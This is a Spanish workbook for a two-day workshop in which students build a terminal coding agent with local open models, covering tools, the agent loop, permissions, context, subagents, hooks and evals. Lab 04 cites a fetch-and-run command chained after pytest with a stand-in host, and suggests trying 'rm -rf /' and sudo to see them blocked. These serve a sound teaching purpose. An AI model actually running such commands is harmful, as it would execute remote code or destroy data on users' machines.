# Cuaderno del alumno · Forja: construye tu propio agente de código

> Workshop de 2 días. Al terminar tendrás **tu propio agente de código de terminal** —como los comerciales— funcionando con modelos abiertos en tu máquina, y entenderás cada pieza porque la habrás escrito tú.

## Cómo usar este cuaderno
- Cada lab: **objetivo → conceptos → lo que implementas → ejecuta → checkpoint → retos**.
- El código a completar está en `forja/` (busca `TODO NN.x`). Los tests de cada lab están en `tests/test_lNN_*.py`: `python scripts/tasks.py test NN`.
- Cuando los tests de un lab pasan, la capacidad se activa sola en tu CLI (`forja`). Los labs pendientes aparecen como avisos.
- ¿Te has quedado atrás? `python scripts/tasks.py catchup NN` copia la solución de los labs anteriores (con copia de seguridad de lo tuyo).
- Proyecto de prácticas: `playground/` (una mini librería de facturas con bugs a propósito). Para dejarlo como al principio: `python scripts/tasks.py reset`.

## Mapa
| Día | Lab | Tema | Lo que gana tu agente |
|---|---|---|---|
| 1 | 00 | Setup y primer contacto | — |
| 1 | 01 | Cliente LLM con streaming | chat en streaming |
| 1 | 02 | Tools de ficheros | leer, buscar y editar |
| 1 | 03 | El bucle del agente | actuar en bucle |
| 1 | 04 | Bash y permisos | ejecutar comandos con permisos |
| 1 | 05 | La CLI: tu agente de terminal | interfaz completa |
| 2 | 06 | Ingeniería de contexto | conoce tu proyecto |
| 2 | 07 | Gestión de contexto y compactación | sesiones largas |
| 2 | 08 | Planificar antes de actuar | planifica |
| 2 | 09 | Subagentes | delega |
| 2 | 10 | Extensibilidad: hooks, skills y MCP | hooks, skills, MCP |
| 2 | 11 | Sesiones y deshacer | reanudar y deshacer |
| 2 | 12 | Evals: medir tu agente | se mide |

---

## Lab 00 · Setup y primer contacto

*Día 1 · 09:00–09:30*

**Objetivo:** Tener Ollama con un modelo que sepa usar tools, el repo instalado y los tests ejecutándose.

### Conceptos
- **Qué vamos a construir:** *Forja*, un agente de código de terminal como los comerciales: lee y edita tu proyecto, ejecuta comandos, pide permiso, planifica, delega en subagentes y se extiende con hooks, skills y MCP. Funciona con modelos abiertos en tu máquina.
- **Agente = modelo + tools + bucle. Harness = todo lo demás** (permisos, contexto, interfaz, sesiones…). El modelo es una pieza intercambiable: el harness es lo que construimos.
- **Cómo funcionan los labs:** cada lab tiene funciones con `TODO` en `forja/` y tests en `tests/`. Cuando los tests pasan, la capacidad se enciende sola en tu CLI. ¿Te quedas atrás? `python scripts/tasks.py catchup NN`.
- **Modelos:** `qwen3:8b` (portátil de 16 GB), `qwen3-coder:30b` (Mac de 32 GB o GPU de 24 GB), o el servidor compartido del aula. OpenRouter solo con modelos open-weight.

### Lo que implementas
Este lab no tiene TODOs.

### Ejecuta
```bash
python -m venv .venv
.venv\Scripts\activate            # Windows   (Linux/macOS: source .venv/bin/activate)
python scripts/tasks.py setup      # instala y crea .env
ollama pull qwen3:8b               # o el modelo de tu nivel de hardware
python scripts/tasks.py test       # casi todo en rojo: es lo esperado
cd playground && python -m pytest -q   # 3 tests fallan: trabajo para tu agente
```

### Checkpoint
`ollama run qwen3:8b "hola"` responde y `python scripts/tasks.py test` se ejecuta (en rojo, como debe ser). El tutor enseña `python scripts/tasks.py demo`: así será tu agente al final del día 2.

### Retos
1. Ejecuta `ollama ps` mientras el modelo responde: ¿va en GPU o CPU? ¿Cuánta memoria usa?
2. Lee `forja/harness.py` por encima: localiza la «puerta» por la que pasa cada tool call.


---

## Lab 01 · Cliente LLM con streaming

*Día 1 · 09:30–10:15*

**Objetivo:** Hablar con cualquier backend OpenAI-compatible en streaming y reconstruir las tool calls que llegan troceadas.

### Conceptos
- **Un protocolo, muchos backends:** Ollama, vLLM, LM Studio, llama.cpp y OpenRouter hablan Chat Completions. El SDK `openai` es solo un cliente HTTP; el modelo es abierto.
- **Streaming:** el texto llega token a token (la CLI se siente viva). Las **tool calls también llegan troceadas**: `index`, luego `id` y `name`, luego el JSON de argumentos en pedazos, a veces de varias llamadas intercaladas.
- **Rarezas de modelos locales:** bloques `<think>…</think>` que pueden partirse entre chunks; tool calls escritas como texto `<tool_call>{…}</tool_call>`.
- **Reintentos:** solo errores transitorios (conexión, 429, 5xx) con backoff exponencial. Un 400 no se arregla reintentando.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 01.1 | `forja/llm.py` | ToolCallAccumulator: concatenar fragmentos por índice |
| 01.2 | `forja/llm.py` | ThinkFilter: quitar <think> aunque la etiqueta llegue partida |
| 01.3 | `forja/llm.py` | LLMClient.stream: reintentos, eventos TextDelta y Done |

### Ejecuta
```bash
python scripts/tasks.py test 01
forja doctor                      # ¿el modelo llama tools?
forja                             # ya es un chat en streaming (aún sin tools)
```

### Checkpoint
`forja doctor` dice ✔ y `forja` responde en streaming. Aparecen avisos «lab NN pendiente»: es normal.

### Retos
1. Mide el *time-to-first-token* local frente a OpenRouter.
2. ¿Qué pasa si el modelo emite dos tool calls con el mismo `index`? ¿Puede ocurrir?

**Tests:** `tests/test_l01_llm.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 02`


---

## Lab 02 · Tools de ficheros

*Día 1 · 10:15–11:15*

**Objetivo:** Dar al agente ojos y manos sobre el proyecto: leer, buscar, crear y editar ficheros con seguridad.

### Conceptos
- **El schema es el prompt:** nombre, docstring y type hints generan el JSON Schema que lee el modelo. Una buena descripción vale más que cualquier instrucción en el system prompt.
- **Las tools nunca lanzan:** cualquier error vuelve al modelo como texto accionable ("aparece 3 veces: añade contexto") para que se corrija solo.
- **edit_file = sustitución exacta de un texto único.** Es el formato más robusto con modelos pequeños (los diffs los generan mal). Errores frecuentes del modelo: incluir los números de línea de `read_file` o cambiar la indentación.
- **Leer antes de editar** y detectar cambios externos (mtime): el agente no pisa lo que no ha visto ni lo que tú has cambiado.
- **Sandbox:** todas las rutas se resuelven dentro del workspace. `../` y rutas absolutas fuera, rechazadas.
- **Explorar sin cargar el repo:** `grep` y `glob` devuelven rutas y líneas; el agente solo lee lo relevante.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 02.1 | `forja/tools.py` | Tool.schema: JSON Schema en formato OpenAI |
| 02.2 | `forja/tools.py` | ToolRegistry.execute: ejecutar sin lanzar nunca |
| 02.3 | `forja/fs_tools.py` | Workspace.resolve: sandbox de rutas |
| 02.4 | `forja/fs_tools.py` | write_file: crear / reescribir con «leer antes» |
| 02.5 | `forja/fs_tools.py` | edit_file: sustitución exacta y única con errores útiles |
| 02.6 | `forja/fs_tools.py` | grep: búsqueda por regex en el workspace |

### Ejecuta
```bash
python scripts/tasks.py test 02
forja --cwd playground
> ¿qué hace la función vencimiento?        (aún no hay bucle: verás la primera tool call)
```

### Checkpoint
Tests del lab 02 en verde. Con el lab 03 todavía pendiente, Forja sigue siendo un chat: el bucle llega a continuación.

### Retos
1. Añade una tool `list_dir` con árbol de 2 niveles. ¿Mejora o empeora la exploración del modelo?
2. Pide al modelo que edite algo y fíjate en sus errores de `old_string`: ¿qué pista añadirías al mensaje de error?

**Tests:** `tests/test_l02_tools.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 03`


---

## Lab 03 · El bucle del agente

*Día 1 · 11:30–12:15*

**Objetivo:** Escribir el bucle que convierte un modelo en un agente: pensar → actuar → observar, hasta terminar.

### Conceptos
- **Diez líneas:** pedir respuesta con tools → si no pide tools, fin → ejecutar → añadir resultados → repetir. Todo framework de agentes es esto con más capas.
- **El historial es el estado:** cada `assistant` con `tool_calls` va seguido de un mensaje `tool` por cada `tool_call_id`. Romper ese par = error 400 en casi cualquier backend.
- **Lecturas en paralelo, escrituras en orden:** varias `read_file`/`grep` a la vez se ejecutan en paralelo; una edición y un `pytest` nunca.
- **Paradas explícitas:** respuesta final, máximo de pasos, bucle detectado (misma tool + mismos argumentos) e interrupción del usuario (Ctrl+C).
- **El bucle no sabe de permisos ni de interfaz:** recibe una función `execute` (la puerta del harness) y unos `events`. Por eso lo reutilizamos para subagentes y evals.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 03.1 | `forja/agent.py` | _run_calls: lecturas consecutivas en paralelo, orden preservado |
| 03.2 | `forja/agent.py` | run: el bucle con streaming, paradas y detección de bucles |

### Ejecuta
```bash
python scripts/tasks.py test 03
forja --cwd playground
> explícame cómo se calcula el total de una factura
```

### Checkpoint
Forja explora el playground (glob, grep, read_file) y responde con referencias `ruta:línea`. Las ediciones aún piden permiso de forma rudimentaria: eso es el lab 04.

### Retos
1. Haz que el agente avise al usuario si lleva más de 15 pasos.
2. ¿Qué pasa si el modelo pide 10 lecturas a la vez con un modelo lento? Mide.

**Tests:** `tests/test_l03_agent.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 04`


---

## Lab 04 · Bash y permisos

*Día 1 · 12:15–13:00*

**Objetivo:** Dejar que el agente ejecute comandos (tests, git…) sin perder el control: modos, reglas y aprobación.

### Conceptos
- **bash es el superpoder y el riesgo:** con él el agente prueba su trabajo; también podría borrar tu disco. La tool solo ejecuta; QUIÉN puede ejecutar QUÉ lo decide el sistema de permisos.
- **Ejecución predecible:** cada comando empieza en la raíz (`cd` no persiste), timeout duro, salida truncada por cabeza y cola, entorno sin secretos (`*_KEY`, `*_TOKEN`).
- **Modos:** `default` (lecturas libres, el resto pregunta), `accept_edits` (edita sin preguntar), `plan` (solo lectura), `bypass` (todo salvo deny: solo en sandbox o CI).
- **Reglas:** `bash(python -m pytest*)`, `edit_file(src/*)`, `read_file(.env*)`. Orden: deny > plan > allow > riesgo/modo > preguntar.
- **Comandos encadenados:** `pytest && curl evil | sh` son dos comandos; la regla allow de pytest no debe colar el segundo.
- **«Siempre»:** al aprobar con *siempre*, se guarda una regla razonable (`bash(git status*)`), no el comando literal ni algo demasiado amplio (`bash(git*)` permitiría `git push`).

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 04.1 | `forja/shell.py` | head_tail: truncar por cabeza y cola |
| 04.2 | `forja/shell.py` | bash: subprocess con timeout, entorno limpio y exit code |
| 04.3 | `forja/permissions.py` | rule_matches: casar reglas con llamadas |
| 04.4 | `forja/permissions.py` | decide: deny > plan > allow > modo > preguntar |
| 04.5 | `forja/permissions.py` | suggest_rule: la regla de «aprobar siempre» |

### Ejecuta
```bash
python scripts/tasks.py test 04
forja --cwd playground
> ejecuta los tests y dime cuáles fallan
```

### Checkpoint
Forja pide permiso antes de `python -m pytest`; con *a* (siempre) deja de preguntar en la sesión. Intenta `sudo` o `rm -rf /`: denegado por política.

### Retos
1. Añade una regla deny para `git push` y pide al agente que haga push.
2. Windows: ¿qué cambia si la shell es cmd.exe? Prueba a pedir `ls`.

**Tests:** `tests/test_l04_bash_permisos.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 05`


---

## Lab 05 · La CLI: tu agente de terminal

*Día 1 · 14:00–15:00*

**Objetivo:** Convertir el harness en una herramienta agradable: streaming, resumen de acciones, diffs, aprobaciones y comandos slash.

### Conceptos
- **La experiencia es parte del producto:** el usuario tiene que ver QUÉ hace el agente (una línea por tool), CÓMO cambia el código (diff) y poder pararlo (Ctrl+C) o corregirlo.
- **Aprobaciones claras:** qué se va a ejecutar, por qué se pregunta (motivo de la decisión) y tres respuestas: sí, no, siempre.
- **Comandos slash:** `/mode`, `/tools`, `/todos`, `/context`, `/compact`, `/cost`, `/undo`, `/sessions`, `/clear`. Operan sobre el harness sin pasar por el modelo.
- **Headless:** `forja -p "…"` ejecuta y sale: scripts, CI y evals (lab 12). Sin usuario, lo que pide permiso se deniega.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 05.1 | `forja/cli.py` | summarize_call: una línea legible por tool call |
| 05.2 | `forja/cli.py` | diff_styles: colorear el diff |
| 05.3 | `forja/cli.py` | ask_approval: sí / no / siempre |
| 05.4 | `forja/cli.py` | handle_slash: comandos slash |

### Ejecuta
```bash
python scripts/tasks.py test 05
forja --cwd playground --mode accept_edits
> arregla el bug del redondeo de importes y comprueba con los tests
/tools
/cost
```

### Checkpoint
**Hito del día 1** (15:15): Forja arregla los 3 tests que fallan en `playground/` con tu modelo local. Compara con el compañero que usa otro modelo.

### Retos
1. Añade `/model <nombre>` para cambiar de modelo en caliente.
2. Muestra en el prompt de la REPL el % de contexto usado.

**Tests:** `tests/test_l05_cli.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 06`


---

## Lab 06 · Ingeniería de contexto

*Día 2 · 09:00–09:40*

**Objetivo:** Decidir qué ve el modelo en cada turno: prompt por capas, AGENTS.md, entorno y menciones @fichero.

### Conceptos
- **El system prompt se reconstruye cada turno** por capas: base del agente, recordatorio del modo, instrucciones del proyecto, skills, lista de tareas y entorno (git, SO, fecha, modelo).
- **AGENTS.md:** convención abierta para instrucciones de proyecto que leen varias herramientas. Global del usuario + desde la carpeta más alta hasta la actual: lo más específico, al final.
- **Entorno = verdad barata:** rama y cambios de git, directorio, fecha. Evita que el modelo adivine.
- **@menciones:** `@src/app.py` mete el fichero en el mensaje (y cuenta como leído). Ahorra una vuelta del bucle.
- **Menos es más con modelos locales:** cada token de prompt compite con el código. Instrucciones cortas y concretas.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 06.1 | `forja/context.py` | find_instruction_files: AGENTS.md del usuario y de la jerarquía |
| 06.2 | `forja/context.py` | build_system_prompt: capas en orden |
| 06.3 | `forja/context.py` | expand_mentions: @ruta → contenido |

### Ejecuta
```bash
python scripts/tasks.py test 06
forja --cwd playground
> revisa @facturas/importes.py y dime si cumple lo que dice AGENTS.md
```

### Checkpoint
El agente cita reglas del `playground/AGENTS.md` (half-up, no tocar tests) sin que se las digas.

### Retos
1. Escribe tu `~/.forja/AGENTS.md` con tus preferencias (idioma, estilo).
2. Añade al entorno la versión de Python y los últimos 3 commits.

**Tests:** `tests/test_l06_contexto.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 07`


---

## Lab 07 · Gestión de contexto y compactación

*Día 2 · 09:40–10:25*

**Objetivo:** Que una sesión larga quepa en la ventana de un modelo local sin romper el historial.

### Conceptos
- **El presupuesto:** modelos locales trabajan con 16–32k tokens efectivos. Un `pytest` verboso o un fichero grande se comen la ventana.
- **Nivel 1 — microcompactación (gratis):** vaciar salidas de tools antiguas. El modelo ya las usó; si las necesita, vuelve a leer.
- **Nivel 2 — compactación (1 llamada):** resumir los turnos antiguos (objetivo, ficheros, comandos, decisiones, pendientes) y conservar los recientes.
- **Invariante:** solo se corta antes de un mensaje `user`. Nunca entre un `tool_calls` y sus `tool`.
- **Es con pérdida:** mídelo con evals (lab 12) usando una ventana pequeña.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 07.1 | `forja/compaction.py` | microcompact: vaciar salidas antiguas |
| 07.2 | `forja/compaction.py` | compact: resumen + turnos recientes, sin romper pares |

### Ejecuta
```bash
python scripts/tasks.py test 07
forja --cwd playground
> lee todos los ficheros del proyecto y resúmelos
/context
/compact
/context
```

### Checkpoint
`/context` baja tras `/compact` y el agente sigue sabiendo qué estaba haciendo.

### Retos
1. Pon `"contextWindow": 6000` en `.forja/settings.json` y trabaja: ¿cuándo compacta?
2. Compacta con un modelo más pequeño que el principal.

**Tests:** `tests/test_l07_compactacion.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 08`


---

## Lab 08 · Planificar antes de actuar

*Día 2 · 10:25–11:10*

**Objetivo:** Lista de tareas visible y modo plan: el agente investiga, propone y solo ejecuta cuando apruebas.

### Conceptos
- **todo_write:** el agente mantiene su lista (pending / in_progress / completed). Obliga a descomponer y mejora mucho la constancia de modelos pequeños en tareas largas. Una sola tarea en curso.
- **La lista vuelve al contexto** cada turno (capa del system prompt): el agente no se pierde.
- **Modo plan:** solo lectura por permisos, no por buena voluntad del modelo. Cuando tiene un plan, llama a `exit_plan_mode`; si lo apruebas, el harness cambia a modo default.
- **Cuándo usarlo:** cambios de varios ficheros, código que no conoces, cualquier cosa difícil de deshacer.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 08.1 | `forja/planning.py` | todo_write con validación |
| 08.2 | `forja/planning.py` | exit_plan_mode con aprobación del usuario |

### Ejecuta
```bash
python scripts/tasks.py test 08
forja --cwd playground --mode plan
> añade descuentos porcentuales a las facturas (antes del IVA) con tests
/todos
```

### Checkpoint
En modo plan el agente investiga, presenta un plan y, al aprobarlo, lo ejecuta marcando tareas.

### Retos
1. Al aprobar, pasa a `accept_edits` en vez de `default`. ¿Cuándo es buena idea?
2. Muestra la lista de tareas en vivo bajo cada respuesta.

**Tests:** `tests/test_l08_planificacion.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 09`


---

## Lab 09 · Subagentes

*Día 2 · 11:25–12:10*

**Objetivo:** Delegar exploraciones y revisiones en agentes con contexto propio y tools restringidas.

### Conceptos
- **El problema:** explorar un repo cuesta 20 lecturas y 30k tokens que se quedan en el contexto del agente principal para siempre.
- **La solución:** la tool `task` lanza un subagente con contexto LIMPIO (system + prompt) que devuelve solo la conclusión. El principal paga ~300 tokens.
- **Mismo bucle, otras tools:** reutilizamos `Agent` del lab 03 con un subconjunto de tools y la MISMA puerta de permisos. Un subagente no lanza subagentes.
- **Perfiles en Markdown:** `.forja/agents/revisor.md` con frontmatter (name, description, tools). La descripción es lo que lee el modelo para decidir cuándo delegar.
- **El prompt del subagente debe ser autocontenido:** no ve la conversación.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 09.1 | `forja/subagents.py` | load_profiles: perfiles desde Markdown |
| 09.2 | `forja/subagents.py` | task: lanzar un subagente con contexto limpio |

### Ejecuta
```bash
python scripts/tasks.py test 09
cp -r examples/project/.forja playground/      # Windows: xcopy /E /I examples\project\.forja playground\.forja
forja --cwd playground
> usa un subagente para averiguar todos los sitios donde se redondea
> pide al revisor que revise mis cambios sin commitear
```

### Checkpoint
Ves las tool calls del subagente con prefijo `[explore]` y el contexto del principal apenas crece (`/context`).

### Retos
1. Crea un subagente `tester` que solo pueda ejecutar `python -m pytest*`.
2. Ejecuta el subagente con un modelo más pequeño y rápido.

**Tests:** `tests/test_l09_subagentes.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 10`


---

## Lab 10 · Extensibilidad: hooks, skills y MCP

*Día 2 · 12:10–13:20*

**Objetivo:** Que el equipo extienda el agente sin tocar su código: política determinista, conocimiento bajo demanda y herramientas externas.

### Conceptos
- **Hooks = garantías:** AGENTS.md *pide*, un hook *impide*. Comandos de shell en `settings.json` que reciben el evento como JSON por stdin. Exit 2 bloquea; exit 0 sigue. Es la convención que usan los agentes comerciales: lo que aprendáis aquí os sirve allí.
- **Eventos:** `PreToolUse` (bloquear), `PostToolUse` (feedback, p. ej. linter), `UserPromptSubmit` (filtrar o añadir contexto), `Stop` (no terminar hasta que pasen los tests).
- **Skills = divulgación progresiva:** en el prompt solo va el catálogo (nombre + descripción); el cuerpo se carga con la tool `skill` cuando hace falta. Formato portable `SKILL.md`.
- **MCP:** servidores que exponen tools (issues, BD, wiki, CI). Forja los arranca desde `settings.json` y los registra como `mcp__servidor__tool`, con riesgo `exec`: pasan por permisos.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 10.1 | `forja/hooks.py` | matching: hooks por evento y matcher |
| 10.2 | `forja/hooks.py` | run: ejecutar y traducir códigos de salida |
| 10.3 | `forja/skills.py` | discover_skills: catálogo de SKILL.md |
| 10.4 | `forja/skills.py` | skill: cargar el cuerpo bajo demanda |
| 10.5 | `forja/mcp_tools.py` | mcp_tool_name: espacio de nombres mcp__server__tool |

### Ejecuta
```bash
python scripts/tasks.py test 10
cp -r examples/project/.forja playground/      # si no lo hiciste en el lab 09
forja --cwd playground
> lista las issues abiertas, arregla la #12 y comenta en la issue qué cambiaste
> haz commit siguiendo la convención del repo
```

### Checkpoint
El hook Stop no deja terminar con tests en rojo; el agente carga la skill `conventional-commits` antes de hacer commit; las tools `mcp__issues__*` aparecen en `/tools`.

### Retos
1. Hook PostToolUse que ejecute `ruff` sobre el fichero editado.
2. Conecta un servidor MCP real de tu equipo (o el de seguros del workshop de nivel 3).

**Tests:** `tests/test_l10_extensiones.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 11`


---

## Lab 11 · Sesiones y deshacer

*Día 2 · 14:20–14:55*

**Objetivo:** Retomar sesiones y deshacer lo que hizo el agente sin depender de git.

### Conceptos
- **Transcript JSONL append-only:** un mensaje por línea en `.forja/sessions/`. Reanudar, auditar y depurar. Tras compactar, una marca con el nuevo estado.
- **Checkpoints:** antes de que una tool modifique un fichero, se guarda su contenido original (o que no existía) — solo la primera vez por turno.
- **/undo:** restaura los ficheros del último turno con cambios. Funciona en carpetas sin git y no toca tus commits.
- **Límite:** los efectos de `bash` (instalar paquetes, borrar con `rm`) no se deshacen. Por eso bash pasa por permisos.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 11.1 | `forja/session.py` | Transcript.append |
| 11.2 | `forja/session.py` | Transcript.load (con marcas de compactación) |
| 11.3 | `forja/session.py` | Checkpoints.before_write |
| 11.4 | `forja/session.py` | Checkpoints.undo |

### Ejecuta
```bash
python scripts/tasks.py test 11
forja --cwd playground --mode accept_edits
> cambia el vencimiento por defecto a 60 días
/undo
/sessions
forja --cwd playground --resume <id>
```

### Checkpoint
`/undo` deja el fichero como estaba y `--resume` continúa la conversación anterior.

### Retos
1. `/undo N` para deshacer varios turnos.
2. `/rewind`: deshacer ficheros Y volver el historial al mismo punto.

**Tests:** `tests/test_l11_sesiones.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 12`


---

## Lab 12 · Evals: medir tu agente

*Día 2 · 14:55–16:00*

**Objetivo:** Comparar modelos y cambios del harness con tareas reales y comprobaciones objetivas.

### Conceptos
- **Sin medir, todo es opinión.** ¿Es mejor `qwen3-coder:30b` que `qwen3:8b`? ¿Tu nuevo prompt ayuda? Se mide.
- **Tarea = prompt + comprobación objetiva** sobre una COPIA limpia del proyecto: tests (`command`), tests OCULTOS que se copian después (`hidden`, para que no haga trampa), contenido de la respuesta (`answer_contains`) y no modificar nada (`forbid_changes`).
- **Headless + bypass dentro de la copia:** el sandbox es la carpeta temporal.
- **Varias repeticiones:** los modelos no son deterministas. Mira pass rate, pasos, tiempo y tokens.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 12.1 | `forja/evals.py` | grade: aplicar las comprobaciones |
| 12.2 | `forja/evals.py` | summarize: pass rate, por tarea, pasos, tiempo, tokens |

### Ejecuta
```bash
python scripts/tasks.py test 12
python scripts/tasks.py evals --only fix_redondeo
python scripts/tasks.py evals --repeat 3
python scripts/tasks.py evals --model qwen3-coder:30b --repeat 3
```

### Checkpoint
Tienes un informe en `out/` y puedes decir, con números, qué modelo usarías y para qué tareas.

### Retos
1. Añade una tarea propia a `evals/tasks.yaml`.
2. Compara tu harness con y sin `todo_write` en el prompt base.

**Tests:** `tests/test_l12_evals.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup end`


---

## Proyecto final (día 2, 16:00–17:00): tu Forja

Personaliza tu agente para tu forma de trabajar y demuéstralo con números:

1. `~/.forja/AGENTS.md` con tus preferencias y un `AGENTS.md` para un repo real tuyo.
2. Una **skill** de tu equipo (convenciones, despliegue, revisión…).
3. Un **hook** que garantice algo que hoy pides por favor (tests, linter, secretos).
4. Un **subagente** especializado.
5. Una **tarea de eval** que represente tu trabajo diario, y el informe comparando dos modelos.

Demo de 3 minutos por persona o pareja: qué has añadido y qué ha cambiado en las evals.

---

## Glosario
- **Agente** — Modelo + tools + bucle que decide y actúa hasta terminar una tarea.
- **Harness** — Todo lo que rodea al bucle: permisos, contexto, interfaz, hooks, sesiones.
- **Tool call** — Petición estructurada (nombre + argumentos JSON) que el modelo hace al harness. El modelo no ejecuta nada.
- **Streaming** — Recibir la respuesta en trozos según se genera.
- **Ventana de contexto** — Máximo de tokens que el modelo ve a la vez.
- **Compactación** — Reducir el historial (vaciar salidas antiguas, resumir) para que quepa.
- **Modo plan** — Modo de solo lectura en el que el agente propone un plan antes de actuar.
- **Subagente** — Agente lanzado por otro con contexto limpio y tools restringidas.
- **Hook** — Comando que el harness ejecuta en un punto fijo; puede bloquear (exit 2).
- **Skill** — Instrucciones que se cargan bajo demanda; en el prompt solo va su descripción.
- **MCP** — Protocolo estándar para conectar herramientas externas a un agente.
- **Eval** — Tarea con comprobación objetiva para medir un agente o un modelo.
